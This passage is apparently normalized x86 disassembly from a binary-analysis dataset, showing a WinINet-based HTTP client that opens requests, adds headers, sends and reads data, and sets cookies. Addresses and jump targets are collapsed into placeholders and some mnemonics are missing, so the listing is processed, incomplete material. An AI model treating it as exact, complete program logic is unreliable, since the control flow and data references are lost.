mov [ ebp - 0xcc ] eax
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x4 ]
dec eax
cmp eax 0x800
jle r-xdata
pop edi
pop esi
mov ecx [ ebp - 0x20 ]
xor ecx ebp
call sub_4097f0
leave
retn 0x14
mov eax [ ebp - 0xc4 ]
mov al [ eax ]
mov [ ebp - 0xcd ] al
mov eax [ ebp - 0xc8 ]
mov cl [ ebp - 0xcd ]
mov [ eax ] cl
mov eax [ ebp - 0xc4 ]
inc eax
mov [ ebp - 0xc4 ] eax
mov eax [ ebp - 0xc8 ]
inc eax
mov [ ebp - 0xc8 ] eax
cmp [ ebp - 0xcd ] 0x0
jne r-xdata
movzx eax [ ebp + 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x4 ]
dec eax
push eax
mov eax [ ebp - 0x4 ]
inc eax
push eax
push [ ebp - 0x10 ]
call memcpy
add esp 0xc
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x10 ]
mov [ ecx + eax - 0x1 ] 0x0
movzx eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor al al
jmp r-xdata
mov [ ebp - 0x5 ] 0x1
mov eax [ ebp - 0x10 ]
dec eax
mov [ ebp - 0xd4 ] eax
mov eax [ ebp - 0xc ]
inc eax
inc eax
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
dec eax
mov [ ebp - 0xbc ] eax
jmp r-xdata
mov [ ebp - 0x48 ] r--data
push r--data
lea eax [ ebp - 0x48 ]
push eax
call _CxxThrowException
mov eax [ ebp - 0xd4 ]
mov al [ eax + 0x1 ]
mov [ ebp - 0xd5 ] al
inc [ ebp - 0xd4 ]
cmp [ ebp - 0xd5 ] 0x0
jne r-xdata
mov edi [ ebp - 0xd4 ]
push 0xa
pop ecx
mov esi r--data
[ edi ] [ esi ]
movsb [ edi ] [ esi ]
push [ ebp - 0x10 ]
push [ ebp - 0x14 ]
push [ ebp - 0x18 ]
call [ InternetSetCookieA@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0xbc ]
mov al [ eax + 0x1 ]
mov [ ebp - 0xbd ] al
inc [ ebp - 0xbc ]
cmp [ ebp - 0xbd ] 0x0
jne r-xdata
mov edi [ ebp - 0xbc ]
push 0xa
pop ecx
mov esi r--data
[ edi ] [ esi ]
movsb [ edi ] [ esi ]
movzx eax [ ebp - 0x5 ]
test eax eax
jne r-xdata
sub_407d9b
push ebp
mov ebp esp
sub esp 0x30
mov [ ebp - 0x1c ] ecx
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x1c ]
cmp [ eax + 0x414 ] 0x0
je r-xdata
mov [ ebp - 0xc ] r--data
push r--data
lea eax [ ebp - 0xc ]
push eax
call _CxxThrowException
mov eax [ ebp - 0x1c ]
cmp [ eax + 0x414 ] 0xffffffff
jne r-xdata
mov eax [ ebp - 0x1c ]
cmp [ eax + 0x430 ] 0x2
jne r-xdata
and [ ebp - 0x20 ] 0x0
mov [ ebp - 0x20 ] 0x800000
jmp r-xdata
mov [ ebp - 0x10 ] r--data
push r--data
lea eax [ ebp - 0x10 ]
push eax
call _CxxThrowException
mov eax [ ebp - 0x1c ]
cmp [ eax + 0x418 ] 0xffffffff
jne r-xdata
push 0x0
mov eax [ ebp - 0x20 ]
or eax 0x4400040
push eax
push rw-data
push [ ebp + 0xc ]
push r--data
push [ ebp + 0x8 ]
push r--data
mov eax [ ebp - 0x1c ]
push [ eax + 0x414 ]
call [ HttpOpenRequestA@IAT ]
mov ecx [ ebp - 0x1c ]
mov [ ecx + 0x418 ] eax
mov eax [ ebp - 0x1c ]
cmp [ eax + 0x418 ] 0x0
je r-xdata
push 0x80000000
push 0x36
push r--data
mov eax [ ebp - 0x1c ]
push [ eax + 0x418 ]
call [ HttpAddRequestHeadersA@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0x1c ]
call sub_407d77
inc eax
push eax
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x1c ]
call sub_407d77
inc eax
push eax
push [ ebp - 0x8 ]
mov ecx [ ebp - 0x1c ]
call sub_407d88
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x24 ]
inc eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x14 ] r--data
push r--data
lea eax [ ebp - 0x14 ]
push eax
call _CxxThrowException
mov eax [ ebp - 0x24 ]
mov al [ eax ]
mov [ ebp - 0x29 ] al
inc [ ebp - 0x24 ]
cmp [ ebp - 0x29 ] 0x0
jne r-xdata
mov eax [ ebp - 0x24 ]
sub eax [ ebp - 0x28 ]
mov [ ebp - 0x30 ] eax
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
push [ ebp - 0x30 ]
push [ rw-data ]
mov eax [ ebp - 0x1c ]
push [ eax + 0x418 ]
call [ HttpSendRequestA@IAT ]
test eax eax
jne r-xdata
push [ ebp - 0x8 ]
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov al 0x1
leave
retn 0x8
call [ GetLastError@IAT ]
cmp eax 0x2f88
je r-xdata
push [ ebp - 0x8 ]
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov [ ebp - 0x18 ] r--data
push r--data
lea eax [ ebp - 0x18 ]
push eax
call _CxxThrowException
sub_407f56
push ebp
mov ebp esp
sub esp 0x460
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x42c ] ecx
and [ ebp - 0x410 ] 0x0
and [ ebp - 0x40c ] 0x0
mov eax [ ebp - 0x42c ]
cmp [ eax + 0x414 ] 0x0
je r-xdata
mov [ ebp - 0x414 ] r--data
push r--data
lea eax [ ebp - 0x414 ]
push eax
call _CxxThrowException
mov eax [ ebp - 0x42c ]
cmp [ eax + 0x414 ] 0xffffffff
jne r-xdata
mov eax [ ebp - 0x42c ]
cmp [ eax + 0x430 ] 0x2
jne r-xdata
and [ ebp - 0x430 ] 0x0
mov [ ebp - 0x430 ] 0x800000
jmp r-xdata
mov [ ebp - 0x418 ] r--data
push r--data
lea eax [ ebp - 0x418 ]
push eax
call _CxxThrowException
mov eax [ ebp - 0x42c ]
cmp [ eax + 0x418 ] 0xffffffff
jne r-xdata
push 0x0
mov eax [ ebp - 0x430 ]
or eax 0x4400040
push eax
push 0x0
push [ ebp + 0xc ]
push r--data
push [ ebp + 0x8 ]
push r--data
mov eax [ ebp - 0x42c ]
push [ eax + 0x414 ]
call [ HttpOpenRequestA@IAT ]
mov ecx [ ebp - 0x42c ]
mov [ ecx + 0x418 ] eax
mov eax [ ebp - 0x42c ]
cmp [ eax + 0x418 ] 0x0
je r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x434 ] eax
mov eax [ ebp - 0x434 ]
inc eax
mov [ ebp - 0x438 ] eax
push 0x10000000
push 0x36
push r--data
mov eax [ ebp - 0x42c ]
push [ eax + 0x418 ]
call [ HttpAddRequestHeadersA@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x434 ]
mov al [ eax ]
mov [ ebp - 0x439 ] al
inc [ ebp - 0x434 ]
cmp [ ebp - 0x439 ] 0x0
jne r-xdata
mov eax [ ebp - 0x434 ]
sub eax [ ebp - 0x438 ]
mov [ ebp - 0x440 ] eax
push 0x10000000
push [ ebp - 0x440 ]
push [ ebp + 0x10 ]
mov eax [ ebp - 0x42c ]
push [ eax + 0x418 ]
call [ HttpAddRequestHeadersA@IAT ]
test eax eax
jne r-xdata
jmp r-xdata
mov [ ebp - 0x41c ] r--data
push r--data
lea eax [ ebp - 0x41c ]
push eax
call _CxxThrowException
mov ax [ r--data ]
mov [ ebp - 0x408 ] ax
push 0x3fe
push 0x0
lea eax [ ebp - 0x406 ]
push eax
call memset
add esp 0xc
mov eax [ ebp - 0x42c ]
push [ eax + 0x40c ]
push r--data
lea eax [ ebp - 0x408 ]
push eax
call sprintf
add esp 0xc
lea eax [ ebp - 0x408 ]
mov [ ebp - 0x444 ] eax
mov eax [ ebp - 0x444 ]
inc eax
mov [ ebp - 0x448 ] eax
mov [ ebp - 0x420 ] r--data
push r--data
lea eax [ ebp - 0x420 ]
push eax
call _CxxThrowException
mov eax [ ebp - 0x444 ]
mov al [ eax ]
mov [ ebp - 0x449 ] al
inc [ ebp - 0x444 ]
cmp [ ebp - 0x449 ] 0x0
jne r-xdata
mov eax [ ebp - 0x444 ]
sub eax [ ebp - 0x448 ]
mov [ ebp - 0x450 ] eax
push 0x10000000
push [ ebp - 0x450 ]
lea eax [ ebp - 0x408 ]
push eax
mov eax [ ebp - 0x42c ]
push [ eax + 0x418 ]
call [ HttpAddRequestHeadersA@IAT ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x454 ] eax
mov eax [ ebp - 0x454 ]
inc eax
mov [ ebp - 0x458 ] eax
mov [ ebp - 0x424 ] r--data
push r--data
lea eax [ ebp - 0x424 ]
push eax
call _CxxThrowException
mov eax [ ebp - 0x454 ]
mov al [ eax ]
mov [ ebp - 0x459 ] al
inc [ ebp - 0x454 ]
cmp [ ebp - 0x459 ] 0x0
jne r-xdata
mov eax [ ebp - 0x454 ]
sub eax [ ebp - 0x458 ]
mov [ ebp - 0x460 ] eax
mov eax [ ebp - 0x42c ]
push [ eax + 0x40c ]
mov eax [ ebp - 0x42c ]
push [ eax + 0x4 ]
push [ ebp - 0x460 ]
push [ rw-data ]
mov eax [ ebp - 0x42c ]
push [ eax + 0x418 ]
call [ HttpSendRequestA@IAT ]
test eax eax
jne r-xdata
push [ ebp - 0x410 ]
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov al 0x1
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4097f0
leave
retn 0xc
call [ GetLastError@IAT ]
cmp eax 0x2f88
je r-xdata
push [ ebp - 0x410 ]
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov [ ebp - 0x428 ] r--data
push r--data
lea eax [ ebp - 0x428 ]
push eax
call _CxxThrowException
sub_4082c9
push ebp
mov ebp esp
sub esp 0x460
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x42c ] ecx
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x4 ] eax
and [ ebp - 0x410 ] 0x0
and [ ebp - 0x40c ] 0x0
mov eax [ ebp - 0x42c ]
cmp [ eax + 0x414 ] 0x0
je r-xdata
mov [ ebp - 0x414 ] r--data
push r--data
lea eax [ ebp - 0x414 ]
push eax
call _CxxThrowException
mov eax [ ebp - 0x42c ]
cmp [ eax + 0x414 ] 0xffffffff
jne r-xdata
mov eax [ ebp - 0x42c ]
cmp [ eax + 0x430 ] 0x2
jne r-xdata
and [ ebp - 0x430 ] 0x0
mov [ ebp - 0x430 ] 0x800000
jmp r-xdata
mov [ ebp - 0x418 ] r--data
push r--data
lea eax [ ebp - 0x418 ]
push eax
call _CxxThrowException
mov eax [ ebp - 0x42c ]
cmp [ eax + 0x418 ] 0xffffffff
jne r-xdata
push 0x0
mov eax [ ebp - 0x430 ]
or eax 0x4400040
push eax
push 0x0
push [ ebp + 0xc ]
push r--data
push [ ebp + 0x8 ]
push r--data
mov eax [ ebp - 0x42c ]
push [ eax + 0x414 ]
call [ HttpOpenRequestA@IAT ]
mov ecx [ ebp - 0x42c ]
mov [ ecx + 0x418 ] eax
mov eax [ ebp - 0x42c ]
cmp [ eax + 0x418 ] 0x0
je r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x434 ] eax
mov eax [ ebp - 0x434 ]
inc eax
mov [ ebp - 0x438 ] eax
push 0x10000000
push 0x36
push r--data
mov eax [ ebp - 0x42c ]
push [ eax + 0x418 ]
call [ HttpAddRequestHeadersA@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x434 ]
mov al [ eax ]
mov [ ebp - 0x439 ] al
inc [ ebp - 0x434 ]
cmp [ ebp - 0x439 ] 0x0
jne r-xdata
mov eax [ ebp - 0x434 ]
sub eax [ ebp - 0x438 ]
mov [ ebp - 0x440 ] eax
push 0x10000000
push [ ebp - 0x440 ]
push [ ebp + 0x10 ]
mov eax [ ebp - 0x42c ]
push [ eax + 0x418 ]
call [ HttpAddRequestHeadersA@IAT ]
test eax eax
jne r-xdata
jmp r-xdata
mov [ ebp - 0x41c ] r--data
push r--data
lea eax [ ebp - 0x41c ]
push eax
call _CxxThrowException
mov ax [ r--data ]
mov [ ebp - 0x408 ] ax
push 0x3fe
push 0x0
lea eax [ ebp - 0x406 ]
push eax
call memset
add esp 0xc
mov eax [ ebp - 0x42c ]
push [ eax + 0x40c ]
push r--data
lea eax [ ebp - 0x408 ]
push eax
call sprintf
add esp 0xc
lea eax [ ebp - 0x408 ]
mov [ ebp - 0x444 ] eax
mov eax [ ebp - 0x444 ]
inc eax
mov [ ebp - 0x448 ] eax
mov [ ebp - 0x420 ] r--data
push r--data
lea eax [ ebp - 0x420 ]
push eax
call _CxxThrowException
mov eax [ ebp - 0x444 ]
mov al [ eax ]
mov [ ebp - 0x449 ] al
inc [ ebp - 0x444 ]
cmp [ ebp - 0x449 ] 0x0
jne r-xdata
mov eax [ ebp - 0x444 ]
sub eax [ ebp - 0x448 ]
mov [ ebp - 0x450 ] eax
push 0x10000000
push [ ebp - 0x450 ]
lea eax [ ebp - 0x408 ]
push eax
mov eax [ ebp - 0x42c ]
push [ eax + 0x418 ]
call [ HttpAddRequestHeadersA@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x454 ] eax
mov eax [ ebp - 0x454 ]
inc eax
mov [ ebp - 0x458 ] eax
mov [ ebp - 0x424 ] r--data
push r--data
lea eax [ ebp - 0x424 ]
push eax
call _CxxThrowException
mov eax [ ebp - 0x454 ]
mov al [ eax ]
mov [ ebp - 0x459 ] al
inc [ ebp - 0x454 ]
cmp [ ebp - 0x459 ] 0x0
jne r-xdata
mov eax [ ebp - 0x454 ]
sub eax [ ebp - 0x458 ]
mov [ ebp - 0x460 ] eax
mov eax [ ebp - 0x42c ]
push [ eax + 0x40c ]
mov eax [ ebp - 0x42c ]
push [ eax + 0x4 ]
push [ ebp - 0x460 ]
push [ ebp - 0x4 ]
mov eax [ ebp - 0x42c ]
push [ eax + 0x418 ]
call [ HttpSendRequestA@IAT ]
test eax eax
jne r-xdata
push [ ebp - 0x410 ]
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov al 0x1
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_4097f0
leave
retn 0x10
call [ GetLastError@IAT ]
cmp eax 0x2f88
je r-xdata
push [ ebp - 0x410 ]
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov [ ebp - 0x428 ] r--data
push r--data
lea eax [ ebp - 0x428 ]
push eax
call _CxxThrowException
sub_40863d
push ebp
mov ebp esp
sub esp 0x460
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x42c ] ecx
and [ ebp - 0x410 ] 0x0
and [ ebp - 0x40c ] 0x0
mov eax [ ebp - 0x42c ]
cmp [ eax + 0x414 ] 0x0
je r-xdata
mov [ ebp - 0x414 ] r--data
push r--data
lea eax [ ebp - 0x414 ]
push eax
call _CxxThrowException
mov eax [ ebp - 0x42c ]
cmp [ eax + 0x414 ] 0xffffffff
jne r-xdata
mov eax [ ebp - 0x42c ]
cmp [ eax + 0x430 ] 0x2
jne r-xdata
and [ ebp - 0x430 ] 0x0
mov [ ebp - 0x430 ] 0x800000
jmp r-xdata
mov [ ebp - 0x418 ] r--data
push r--data
lea eax [ ebp - 0x418 ]
push eax
call _CxxThrowException
mov eax [ ebp - 0x42c ]
cmp [ eax + 0x418 ] 0xffffffff
jne r-xdata
push 0x0
mov eax [ ebp - 0x430 ]
or eax 0x4400040
push eax
push 0x0
push [ ebp + 0xc ]
push r--data
push [ ebp + 0x8 ]
push r--data
mov eax [ ebp - 0x42c ]
push [ eax + 0x414 ]
call [ HttpOpenRequestA@IAT ]
mov ecx [ ebp - 0x42c ]
mov [ ecx + 0x418 ] eax
mov eax [ ebp - 0x42c ]
cmp [ eax + 0x418 ] 0x0
je r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x434 ] eax
mov eax [ ebp - 0x434 ]
inc eax
mov [ ebp - 0x438 ] eax
push 0x10000000
push 0x36
push r--data
mov eax [ ebp - 0x42c ]
push [ eax + 0x418 ]
call [ HttpAddRequestHeadersA@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x434 ]
mov al [ eax ]
mov [ ebp - 0x439 ] al
inc [ ebp - 0x434 ]
cmp [ ebp - 0x439 ] 0x0
jne r-xdata
mov eax [ ebp - 0x434 ]
sub eax [ ebp - 0x438 ]
mov [ ebp - 0x440 ] eax
push 0x10000000
push [ ebp - 0x440 ]
push [ ebp + 0x10 ]
mov eax [ ebp - 0x42c ]
push [ eax + 0x418 ]
call [ HttpAddRequestHeadersA@IAT ]
test eax eax
jne r-xdata
jmp r-xdata
mov [ ebp - 0x41c ] r--data
push r--data
lea eax [ ebp - 0x41c ]
push eax
call _CxxThrowException
mov ax [ r--data ]
mov [ ebp - 0x408 ] ax
push 0x3fe
push 0x0
lea eax [ ebp - 0x406 ]
push eax
call memset
add esp 0xc
mov eax [ ebp - 0x42c ]
push [ eax + 0x40c ]
push r--data
lea eax [ ebp - 0x408 ]
push eax
call sprintf
add esp 0xc
lea eax [ ebp - 0x408 ]
mov [ ebp - 0x444 ] eax
mov eax [ ebp - 0x444 ]
inc eax
mov [ ebp - 0x448 ] eax
mov [ ebp - 0x420 ] r--data
push r--data
lea eax [ ebp - 0x420 ]
push eax
call _CxxThrowException
mov eax [ ebp - 0x444 ]
mov al [ eax ]
mov [ ebp - 0x449 ] al
inc [ ebp - 0x444 ]
cmp [ ebp - 0x449 ] 0x0
jne r-xdata
mov eax [ ebp - 0x444 ]
sub eax [ ebp - 0x448 ]
mov [ ebp - 0x450 ] eax
push 0x10000000
push [ ebp - 0x450 ]
lea eax [ ebp - 0x408 ]
push eax
mov eax [ ebp - 0x42c ]
push [ eax + 0x418 ]
call [ HttpAddRequestHeadersA@IAT ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x454 ] eax
mov eax [ ebp - 0x454 ]
inc eax
mov [ ebp - 0x458 ] eax
mov [ ebp - 0x424 ] r--data
push r--data
lea eax [ ebp - 0x424 ]
push eax
call _CxxThrowException
mov eax [ ebp - 0x454 ]
mov al [ eax ]
mov [ ebp - 0x459 ] al
inc [ ebp - 0x454 ]
cmp [ ebp - 0x459 ] 0x0
jne r-xdata
mov eax [ ebp - 0x454 ]
sub eax [ ebp - 0x458 ]
mov [ ebp - 0x460 ] eax
mov eax [ ebp - 0x42c ]
push [ eax + 0x40c ]
mov eax [ ebp - 0x42c ]
push [ eax + 0x4 ]
push [ ebp - 0x460 ]
push [ rw-data ]
mov eax [ ebp - 0x42c ]
push [ eax + 0x418 ]
call [ HttpSendRequestA@IAT ]
test eax eax
jne r-xdata
push [ ebp - 0x410 ]
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov al 0x1
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4097f0
leave
retn 0xc
call [ GetLastError@IAT ]
cmp eax 0x2f88
je r-xdata
push [ ebp - 0x410 ]
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov [ ebp - 0x428 ] r--data
push r--data
lea eax [ ebp - 0x428 ]
push eax
call _CxxThrowException
sub_4089bd
push ebp
mov ebp esp
sub esp 0x478
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
mov [ ebp - 0x444 ] ecx
push 0x400
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x420 ] eax
mov eax [ ebp - 0x420 ]
mov [ ebp - 0x410 ] eax
push 0x39
pop ecx
mov esi r--data
mov edi [ ebp - 0x410 ]
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
and [ ebp - 0x418 ] 0x0
and [ ebp - 0x40c ] 0x0
mov eax [ ebp - 0x444 ]
cmp [ eax + 0x414 ] 0x0
je r-xdata
mov [ ebp - 0x424 ] r--data
push r--data
lea eax [ ebp - 0x424 ]
push eax
call _CxxThrowException
mov eax [ ebp - 0x444 ]
cmp [ eax + 0x414 ] 0xffffffff
jne r-xdata
mov eax [ ebp - 0x444 ]
cmp [ eax + 0x430 ] 0x2
jne r-xdata
and [ ebp - 0x448 ] 0x0
mov [ ebp - 0x448 ] 0x800000
jmp r-xdata
mov [ ebp - 0x428 ] r--data
push r--data
lea eax [ ebp - 0x428 ]
push eax
call _CxxThrowException
mov eax [ ebp - 0x444 ]
cmp [ eax + 0x418 ] 0xffffffff
jne r-xdata
push 0x0
mov eax [ ebp - 0x448 ]
or eax 0x4400040
push eax
lea eax [ ebp - 0x410 ]
push eax
push [ ebp + 0xc ]
push r--data
push [ ebp + 0x8 ]
push r--data
mov eax [ ebp - 0x444 ]
push [ eax + 0x414 ]
call [ HttpOpenRequestA@IAT ]
mov ecx [ ebp - 0x444 ]
mov [ ecx + 0x418 ] eax
mov eax [ ebp - 0x444 ]
cmp [ eax + 0x418 ] 0x0
je r-xdata
mov eax [ ebp - 0x410 ]
mov [ ebp - 0x44c ] eax
mov eax [ ebp - 0x44c ]
inc eax
mov [ ebp - 0x450 ] eax
mov eax [ ebp - 0x44c ]
mov al [ eax ]
mov [ ebp - 0x451 ] al
inc [ ebp - 0x44c ]
cmp [ ebp - 0x451 ] 0x0
jne r-xdata
mov eax [ ebp - 0x44c ]
sub eax [ ebp - 0x450 ]
mov [ ebp - 0x458 ] eax
push 0x80000000
push [ ebp - 0x458 ]
push [ ebp - 0x410 ]
mov eax [ ebp - 0x444 ]
push [ eax + 0x418 ]
call [ HttpAddRequestHeadersA@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x45c ] eax
mov eax [ ebp - 0x45c ]
inc eax
mov [ ebp - 0x460 ] eax
mov [ ebp - 0x42c ] r--data
push r--data
lea eax [ ebp - 0x42c ]
push eax
call _CxxThrowException
mov eax [ ebp - 0x45c ]
mov al [ eax ]
mov [ ebp - 0x461 ] al
inc [ ebp - 0x45c ]
cmp [ ebp - 0x461 ] 0x0
jne r-xdata
mov eax [ ebp - 0x45c ]
sub eax [ ebp - 0x460 ]
mov [ ebp - 0x468 ] eax
push 0x10000000
push [ ebp - 0x468 ]
push [ ebp + 0x14 ]
mov eax [ ebp - 0x444 ]
push [ eax + 0x418 ]
call [ HttpAddRequestHeadersA@IAT ]
test eax eax
jne r-xdata
mov ax [ r--data ]
mov [ ebp - 0x408 ] ax
push 0x3fe
push 0x0
lea eax [ ebp - 0x406 ]
push eax
call memset
add esp 0xc
mov eax [ ebp - 0x444 ]
push [ eax + 0x40c ]
push r--data
lea eax [ ebp - 0x408 ]
push eax
call sprintf
add esp 0xc
lea eax [ ebp - 0x408 ]
mov [ ebp - 0x46c ] eax
mov eax [ ebp - 0x46c ]
inc eax
mov [ ebp - 0x470 ] eax
mov [ ebp - 0x430 ] r--data
push r--data
lea eax [ ebp - 0x430 ]
push eax
call _CxxThrowException
mov eax [ ebp - 0x46c ]
mov al [ eax ]
mov [ ebp - 0x471 ] al
inc [ ebp - 0x46c ]
cmp [ ebp - 0x471 ] 0x0
jne r-xdata
mov eax [ ebp - 0x46c ]
sub eax [ ebp - 0x470 ]
mov [ ebp - 0x478 ] eax
push 0x10000000
push [ ebp - 0x478 ]
lea eax [ ebp - 0x408 ]
push eax
mov eax [ ebp - 0x444 ]
push [ eax + 0x418 ]
call [ HttpAddRequestHeadersA@IAT ]
test eax eax
jne r-xdata
mov [ rw-data ] 0x28
and [ rw-data ] 0x0
push 0x0
push 0x8
push 0x0
push rw-data
mov eax [ ebp - 0x444 ]
push [ eax + 0x418 ]
call [ HttpSendRequestExA@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x434 ] r--data
push r--data
lea eax [ ebp - 0x434 ]
push eax
call _CxxThrowException
and [ ebp - 0x41c ] 0x0
and [ ebp - 0x414 ] 0x0
lea eax [ ebp - 0x41c ]
push eax
mov eax [ ebp - 0x444 ]
push [ eax + 0x40c ]
mov eax [ ebp - 0x444 ]
push [ eax + 0x4 ]
mov eax [ ebp - 0x444 ]
push [ eax + 0x418 ]
call [ InternetWriteFile@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x438 ] r--data
push r--data
lea eax [ ebp - 0x438 ]
push eax
call _CxxThrowException
push 0x0
push 0x8
push 0x0
mov eax [ ebp - 0x444 ]
push [ eax + 0x418 ]
call [ HttpEndRequestA@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x43c ] r--data
push r--data
lea eax [ ebp - 0x43c ]
push eax
call _CxxThrowException
mov al 0x1
pop edi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4097f0
leave
retn 0x14
mov [ ebp - 0x440 ] r--data
push r--data
lea eax [ ebp - 0x440 ]
push eax
call _CxxThrowException
sub_408dba
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
push 0x0
lea eax [ ebp + 0xc ]
push eax
push [ ebp + 0x8 ]
push 0x16
mov eax [ ebp - 0x4 ]
push [ eax + 0x418 ]
call [ HttpQueryInfoA@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp + 0xc ]
push r--data
mov eax [ ebp - 0x4 ]
push [ eax + 0x41c ]
mov eax [ ebp - 0x4 ]
push [ eax + 0x430 ]
mov eax [ ebp - 0x4 ]
push [ eax + 0x42c ]
mov eax [ ebp - 0x4 ]
push [ eax + 0x420 ]
call sub_406de1
add esp 0x14
xor eax eax
jmp r-xdata
leave
retn 0x8
sub_408e1b
push ebp
mov ebp esp
push 0xffffffff
push sub_40a380
mov eax [ fs : 0x0 ]
push eax
push ecx
sub esp 0x14
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x24 ] ecx
and [ ebp - 0x14 ] 0x0
and [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x24 ]
cmp [ eax + 0x418 ] 0x0
jne r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x24 ]
push [ eax + 0x418 ]
call [ InternetReadFile@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x1c ] r--data
push r--data
lea eax [ ebp - 0x1c ]
push eax
call _CxxThrowException
jmp r-xdata
mov [ ebp - 0x20 ] r--data
push r--data
lea eax [ ebp - 0x20 ]
push eax
call _CxxThrowException
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_408eaa
mov eax [ ebp - 0x24 ]
push [ eax + 0x418 ]
call [ InternetCloseHandle@IAT ]
mov eax [ ebp - 0x24 ]
and [ eax + 0x418 ] 0x0
push [ ebp - 0x18 ]
mov eax [ ebp - 0x24 ]
push [ eax + 0x41c ]
mov eax [ ebp - 0x24 ]
push [ eax + 0x430 ]
mov eax [ ebp - 0x24 ]
push [ eax + 0x42c ]
mov eax [ ebp - 0x24 ]
push [ eax + 0x420 ]
call sub_406de1
add esp 0x14
or [ ebp - 0x4 ] 0xffffffff
mov eax r-xdata
retn
sub_408efc
mov eax [ ebp - 0x24 ]
push [ eax + 0x418 ]
call [ InternetCloseHandle@IAT ]
mov eax [ ebp - 0x24 ]
and [ eax + 0x418 ] 0x0
push r--data
mov eax [ ebp - 0x24 ]
push [ eax + 0x41c ]
mov eax [ ebp - 0x24 ]
push [ eax + 0x430 ]
mov eax [ ebp - 0x24 ]
push [ eax + 0x42c ]
mov eax [ ebp - 0x24 ]
push [ eax + 0x420 ]
call sub_406de1
add esp 0x14
or [ ebp - 0x4 ] 0xffffffff
mov eax r-xdata
retn
sub_408f69
push ebp
mov ebp esp
sub esp 0x8f8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0xc ] eax
mov ax [ r--data ]
mov [ ebp - 0x410 ] ax
push 0x3fe
push 0x0
lea eax [ ebp - 0x40e ]
push eax
call memset
add esp 0xc
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x415 ] 0x0
mov eax [ ebp - 0x824 ]
mov al [ eax ]
mov [ ebp - 0x829 ] al
inc [ ebp - 0x824 ]
cmp [ ebp - 0x829 ] 0x0
jne r-xdata
mov eax [ ebp - 0x824 ]
sub eax [ ebp - 0x828 ]
mov [ ebp - 0x830 ] eax
je r-xdata
push 0x1
push r--data
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
lea eax [ ecx + eax + 0x1 ]
push eax
call strncmp
add esp 0xc
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x834 ] eax
mov eax [ ebp - 0x834 ]
inc eax
